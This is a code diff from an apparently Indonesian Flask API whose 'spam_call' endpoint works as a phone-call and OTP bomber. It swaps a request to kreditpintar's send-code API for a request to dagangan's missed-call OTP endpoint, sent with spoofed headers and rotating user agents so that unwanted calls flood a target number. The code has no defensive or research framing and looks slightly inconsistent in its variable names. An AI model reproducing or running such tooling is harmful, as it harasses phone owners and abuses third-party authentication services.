@@ -1508,13 +1508,16 @@ def spam_call():
 
     if not apikey or not is_apikey_valid(apikey):
         return jsonify({"error": "Invalid or expired API key, plese download new apikey"}), 401
-	
-    # Verifikasi kunci API
-    head_kredit={'Host':'h.kreditpintar.com','content-length':'49','x-user-agent':'Pintar-ID-Cash (WebAndroid;;;id) uuid/7cbf669f-12e2-48a3-9e87-087a89d00f9d version/0.1.0','x-app-version':'APPVERSION_NAME(9999)','accept-language':'id','sec-ch-ua-mobile':'?1','x-adv-uuid':'7cbf669f-12e2-48a3-9e87-087a89d00f9d','user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:48.0) Gecko/20100101 Firefox/48.0','content-type':'application/json','accept':'application/json, text/plain, */*','x-os-type':'WEB','sec-ch-ua-platform':'"Android"','origin':'https://h.kreditpintar.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':f'https://h.kreditpintar.com/H5/code-step?m=0{nomor}','accept-encoding':'gzip, deflate, br, zstd',}
-    json_kredit=json.dumps({"mobileNumber":f"+620{nomor}","type":"VOICE"})
-    response = requests.post("https://h.kreditpintar.com/api/auth/send-code?channel=H5&lang=id",headers=head_kredit, data=json_kredit).text
 
-    if 'batchNo' in response:
+    api_url = "https://rest-api-flask-eosin.vercel.app/user-agent"
+    api_params = {"jum": 1, "apikey": "Hoshiyuki"}
+    api_response = requests.get(api_url, params=api_params)
+    user_agents = api_response.json().get("user_agents", [])
+    user_agent = user_agents[0] if user_agents else "Default User Agent"
+    # Verifikasi kunci API
+    dagang=cihuy.post("https://api.dagangan.com/v2/users/sms", headers = {"Host": "api.dagangan.com", "accept": "application/json", "content-type": "application/json", "content-length": "50", "accept-encoding": "gzip", "user-agent": user_agent, "x-newrelic-id": "Vg8AVlRVDhAIUVFVAAEGX10="}, json = {"phone": f"0{phone}", "otp_method": "missedcall"}).text
+
+    if 'OTP berhasil dikirim' in dagang:
         return jsonify({
             "response": "success",
             "message": f"Berhasil Mengirim Call Ke {nomor}",
